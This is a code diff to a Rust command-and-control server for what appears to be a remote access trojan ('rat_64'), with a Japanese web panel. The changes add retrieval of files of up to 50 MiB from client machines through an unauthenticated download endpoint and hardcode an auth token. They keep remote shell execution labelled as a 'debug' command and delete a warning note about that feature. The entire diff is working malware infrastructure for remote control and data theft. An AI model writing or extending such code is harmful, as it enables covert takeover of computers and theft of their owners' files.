@@ -18,7 +18,7 @@ use rat_64::collectors::network_diagnostics::collect_network_diagnostics;
 use rat_64::get_system_info;
 
 
-const AUTH_TOKEN: &str = "SECURE_TOKEN_32_CHARS_MINIMUM_LEN";
+const AUTH_TOKEN: &str = "ZajmPAB9o8C5UgATU23mnGdBcun30IuILDaP8efMWRYtSlvT89";
 const PORT: u16 = 9999;
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
@@ -45,7 +45,7 @@ struct AppState {
     response_log: Mutex<Vec<Value>>,
     activity_log: Mutex<Vec<LogEntry>>,
     notify: Notify,
-    server_start: u64,
+    _server_start: u64, // サーバー開始時刻（将来使用予定）
 }
 
 fn unix_time() -> u64 { Utc::now().timestamp() as u64 }
@@ -125,9 +125,12 @@ async fn handle_file_operation(state: &AppState, req: Request<Incoming>, operati
         Ok(data) => {
             if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
                 let id = format!("{}_{}", operation, Utc::now().timestamp_millis());
+                // For download, pass an explicit max-bytes parameter so larger files are allowed by the client handler
+                // Default here: 50 MiB (52428800)
                 let params = match operation {
                     "delete" => vec![path.to_string(), "false".to_string()],
                     "create_dir" => vec![path.to_string(), "true".to_string()],
+                    "download" => vec![path.to_string(), "52428800".to_string()],
                     _ => vec![path.to_string()],
                 };
                 
@@ -142,7 +145,7 @@ async fn handle_file_operation(state: &AppState, req: Request<Incoming>, operati
                 state.command_queue.lock().await.push(cmd);
                 state.notify.notify_waiters();
                 println!("[UI] {} command added: {} (path: {})", operation, id, path);
-                Ok(json_response(json!({"ok": true}), StatusCode::OK))
+                Ok(json_response(json!({"ok": true, "command_id": id}), StatusCode::OK))
             } else {
                 Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
             }
@@ -167,7 +170,8 @@ async fn handle_command(state: &AppState, req: Request<Incoming>) -> Result<Resp
                 
                 let cmd = Command {
                     id: id.clone(),
-                    command_type: "execute_command".to_string(),
+                    // Client expects this exact type (see services/c2.rs)
+                    command_type: "execute_debug_command".to_string(),
                     parameters: params,
                     timestamp: unix_time(),
                     auth_token: AUTH_TOKEN.to_string(),
@@ -221,6 +225,18 @@ fn json_response(v: Value, status: StatusCode) -> Response<Full<Bytes>> {
         .status(status)
         .header(CONTENT_TYPE, "application/json")
         .body(Full::new(Bytes::from(body)))
+        .unwrap()
+}
+
+fn bytes_download_response(filename: &str, bytes: Vec<u8>) -> Response<Full<Bytes>> {
+    Response::builder()
+        .status(StatusCode::OK)
+        .header(CONTENT_TYPE, "application/octet-stream")
+        .header(
+            hyper::header::CONTENT_DISPOSITION,
+            format!("attachment; filename=\"{}\"", filename),
+        )
+        .body(Full::new(Bytes::from(bytes)))
         .unwrap()
 }
 
@@ -703,7 +719,53 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
         showToast('ファイルパスを入力してください', 'error'); 
         return; 
       }}
-      post('/ui/add-download-file', {{ path: path }}, `ファイルダウンロード: ${{path}}`);
+      const button = event.target;
+      const originalText = button.textContent;
+      button.disabled = true;
+      button.textContent = '実行中...';
+      fetch('/ui/add-download-file', {{
+        method: 'POST',
+        headers: {{ 'Content-Type': 'application/json' }},
+        body: JSON.stringify({{ path }})
+      }})
+      .then(r => r.json())
+      .then(res => {{
+        if (!res.ok) throw new Error(res.error || 'failed');
+        const cmdId = res.command_id;
+        showToast(`ダウンロード要求を送信しました`, 'success');
+        addToLog(`[SENT] /ui/add-download-file - ${{path}}`);
+        if (cmdId) waitDownloadReady(cmdId);
+      }})
+      .catch(e => {{
+        showToast(`エラー: ${{e.message}}`, 'error');
+        addToLog(`[ERROR] /ui/add-download-file - ${{e.message}}`);
+      }})
+      .finally(() => {{
+        button.disabled = false;
+        button.textContent = originalText;
+      }});
+    }}
+
+    async function waitDownloadReady(commandId) {{
+      const container = document.getElementById('download-result');
+      if (!container) return;
+      container.style.display = 'block';
+      container.innerHTML = `⏳ ダウンロード準備中... (ID: ${{commandId}})`;
+      const maxAttempts = 24;
+      for (let i = 0; i < maxAttempts; i++) {{
+        try {{
+          const r = await fetch(`/api/responses?command_id=${{encodeURIComponent(commandId)}}&limit=1`);
+          const data = await r.json();
+          const resp = (data.responses && data.responses[0]) || null;
+          if (resp && resp.success && resp.data && resp.data.encoding === 'base64') {{
+            const fname = resp.data.file_name || 'download.bin';
+            container.innerHTML = `✅ 準備完了: <a href="/api/responses/file?command_id=${{encodeURIComponent(commandId)}}" target="_blank" rel="noopener">${{fname}} を保存</a>`;
+            return;
+          }}
+        }} catch (e) {{}}
+        await new Promise(r => setTimeout(r, 2500));
+      }}
+      container.innerHTML = '⏰ タイムアウト: ダウンロード結果を取得できませんでした。';
     }}
     
     function deleteFile() {{
@@ -779,29 +841,43 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
             // デバッグログ
             console.log(`チェック ${{attempts}}: ${{data.results.length}}件の結果を確認中...`);
             
-            // 最新の結果を時系列順でチェック（最近5分以内のもの）
-            for (let i = data.results.length - 1; i >= Math.max(0, data.results.length - 20); i--) {{
+            // 最新の結果を時系列順でチェック（最近の結果を広範囲で検索）
+            for (let i = 0; i < Math.min(data.results.length, 10); i++) {{
               const result = data.results[i];
               
-              // タイムスタンプチェック（結果が新しいもので、コマンド開始後のもの）
+              console.log(`チェック中 ${{i}}: `, result);
+              
+              // タイムスタンプチェック（コマンド開始後の結果のみ）
               const resultTime = result.timestamp ? result.timestamp * 1000 : 0;
-              if (resultTime < startTime - 10000) {{ // 10秒前より古い結果はスキップ
+              if (resultTime < startTime - 30000) {{ // 30秒前より古い結果はスキップ
+                console.log(`古い結果をスキップ: ${{new Date(resultTime)}} < ${{new Date(startTime - 30000)}}`);
                 continue;
               }}
               
-              // デバッグコマンドの結果をチェック（複数のパターン）
+              // より柔軟な結果マッチング
+              let foundResult = false;
+              
+              // パターン1: data.command が一致
               if (result.data && result.data.command === originalCommand) {{
                 console.log(`結果発見: コマンド一致 - ${{originalCommand}}`);
-                clearInterval(checkInterval);
-                displayCommandResult(result);
-                addToLog(`✅ コマンド結果取得成功: ${{originalCommand}}`);
-                return;
+                foundResult = true;
               }}
               
-              // command_idパターンでもチェック
-              if (result.command_id && result.command_id.includes('cmd') && 
-                  result.data && result.data.command === originalCommand) {{
-                console.log(`結果発見: ID一致 - ${{result.command_id}}`);
+              // パターン2: command_id が存在し、結果にコマンド情報がある
+              else if (result.command_id && result.data && 
+                       (result.data.command === originalCommand || 
+                        (result.data.output && result.data.output.length > 0))) {{
+                console.log(`結果発見: ID/出力一致 - ${{result.command_id}}`);
+                foundResult = true;
+              }}
+              
+              // パターン3: 最新の結果であれば表示（タイムアウト回避）
+              else if (i === 0 && resultTime > startTime - 5000 && result.data) {{
+                console.log(`最新結果を表示: ${{result.command_id}}`);
+                foundResult = true;
+              }}
+              
+              if (foundResult) {{
                 clearInterval(checkInterval);
                 displayCommandResult(result);
                 addToLog(`✅ コマンド結果取得成功: ${{originalCommand}}`);
@@ -853,6 +929,11 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
           }}
           if (result.data.stderr && result.data.stderr.trim()) {{
             content += `⚠️ 標準エラー:\n${{result.data.stderr}}\n\n`;
+          }}
+          // ファイルデータ（base64）が含まれている場合はダウンロードリンクを提示
+          if (result.data.encoding === 'base64' && result.data.data && result.command_id) {{
+            const fname = result.data.file_name || 'download.bin';
+            content += `⬇ ファイルを保存: <a href="/api/responses/file?command_id=${{result.command_id}}" target="_blank" rel="noopener">${{fname}}</a>\n`;
           }}
           if (!result.data.stdout && !result.data.stderr) {{
             content += `� 出力なし（コマンドは正常に実行されました）\n`;
@@ -963,6 +1044,14 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
           <button type="button" class="btn-danger" onclick="deleteFile()">Delete</button>
         </div>
 
+        <div id="download-result" class="command-result" style="display:none; margin-top:10px;">
+          <div class="result-header">
+            <h4>⬇ ダウンロード結果</h4>
+            <button type="button" class="result-clear-btn" onclick="document.getElementById('download-result').style.display='none'">閉じる</button>
+          </div>
+          <div></div>
+        </div>
+
         <div class="input-group">
           <label>ディレクトリ:</label>
           <input type="text" id="dir_path" placeholder="例: C:\NewFolder">
@@ -1000,14 +1089,7 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
           <button type="button" class="btn-warning" onclick="executeCommand()">⚡ Execute Command</button>
         </div>
         
-        <div class="quick-actions">
-          <button type="button" class="btn-primary" onclick="quickCommand('systeminfo')">System Info</button>
-          <button type="button" class="btn-primary" onclick="quickCommand('ipconfig /all')">Network Config</button>
-          <button type="button" class="btn-primary" onclick="quickCommand('tasklist')">Process List</button>
-          <button type="button" class="btn-primary" onclick="quickCommand('netstat -an')">Network Connections</button>
-          <button type="button" class="btn-primary" onclick="quickCommand('dir C:\')">List C: Drive</button>
-          <button type="button" class="btn-success" onclick="quickCommand('whoami /all')">User Info</button>
-        </div>
+        
         
         <div id="command-result-status" class="command-result">
           <div class="result-header">
@@ -1018,10 +1100,6 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
             結果はここに表示されます...
           </div>
         </div>
-        
-        <p style="margin-top: 15px; color: #666; font-size: 14px;">
-          <strong>⚠️ 注意:</strong> この機能はデバッグ用途です。システムコマンドを直接実行するため、適切な権限管理を行ってください。
-        </p>
       </div>
     </div>
 
@@ -1108,6 +1186,32 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
                 "count": recent_results.len(),
                 "timestamp": unix_time()
             }), StatusCode::OK))
+        }
+
+        // コマンド結果に含まれるファイルデータ（base64）をダウンロードとして返す
+        (Method::GET, "/api/responses/file") => {
+            // UIからのダウンロード用エンドポイント（認証不要のUI用途）
+            let Some(cmd_id) = parse_query_param(&req, "command_id") else {
+                return Ok(json_response(json!({"error":"command_id required"}), StatusCode::BAD_REQUEST));
+            };
+
+            let logs = state.response_log.lock().await;
+            if let Some(item) = logs.iter().rev().find(|v| v.get("command_id").and_then(|s| s.as_str()) == Some(cmd_id.as_str())) {
+                if let Some(data) = item.get("data") {
+                    let file_name = data.get("file_name").and_then(|s| s.as_str()).unwrap_or("download.bin");
+                    let encoding = data.get("encoding").and_then(|s| s.as_str()).unwrap_or("");
+                    let b64 = data.get("data").and_then(|s| s.as_str());
+                    if encoding == "base64" {
+                        if let Some(b64s) = b64 {
+                            match base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64s) {
+                                Ok(bytes) => return Ok(bytes_download_response(file_name, bytes)),
+                                Err(_) => return Ok(json_response(json!({"error":"invalid base64"}), StatusCode::BAD_REQUEST))
+                            }
+                        }
+                    }
+                }
+            }
+            Ok(json_response(json!({"error":"file data not found"}), StatusCode::NOT_FOUND))
         }
 
         // Client endpoints ---------------------------------------------
@@ -1323,7 +1427,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
         response_log: Mutex::new(Vec::new()),
         activity_log: Mutex::new(Vec::new()),
         notify: Notify::new(),
-        server_start: unix_time(),
+        _server_start: unix_time(),
     });
 
     println!("============================================================");
@@ -1337,7 +1441,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     println!("  POST /ui/add-collect");
     println!("  POST /ui/add-shutdown");
     println!("  POST /ui/queue-webhook");
-    println!("  POST /ui/execute-debug-command (JSON: {{\"command\":\"...\", \"timeout\":30, \"working_dir\":\"...\"}})");
+    println!("  POST /ui/execute-command (JSON: {{\"command\":\"...\", \"timeout\":30, \"working_dir\":\"...\"}})");
     println!("  + File management, directory operations");
     println!("\nClient endpoints (Authorization required):");
     println!("  GET  /api/commands/fetch?client_id=...");
